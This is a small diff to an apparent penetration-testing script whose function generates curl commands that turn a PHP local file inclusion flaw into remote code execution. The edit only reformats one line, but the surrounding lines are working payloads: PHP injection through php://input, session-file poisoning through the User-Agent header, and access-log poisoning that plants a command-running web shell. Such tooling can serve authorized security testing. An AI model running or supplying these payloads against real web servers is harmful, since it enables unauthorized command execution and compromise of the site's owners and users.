@@ -39,7 +39,8 @@ def lfi_to_rce_ladder(url: str, param: str) -> list[tuple[str, str]]:
         ("php://input + POST body <?php ...?>",
          f"curl -s -X POST '{base}?{param}=php://input' -d '<?php system(\"id\"); ?>'"),
         ("Read PHP session file (poison User-Agent then include the session)",
-         f"curl -s -A '<?php system(\"id\"); ?>' '{base}?{param}=/var/lib/php/sessions/sess_$(cookie)'"),
+         f"curl -s -A '<?php system(\"id\"); ?>' "
+         f"'{base}?{param}=/var/lib/php/sessions/sess_$(cookie)'"),
         ("Log poison: write PHP via UA into /var/log/apache2/access.log then include",
          f"curl -s -A '<?php system($_GET[c]); ?>' '{base}/' && "
          f"curl -s '{base}?{param}=/var/log/apache2/access.log&c=id'"),
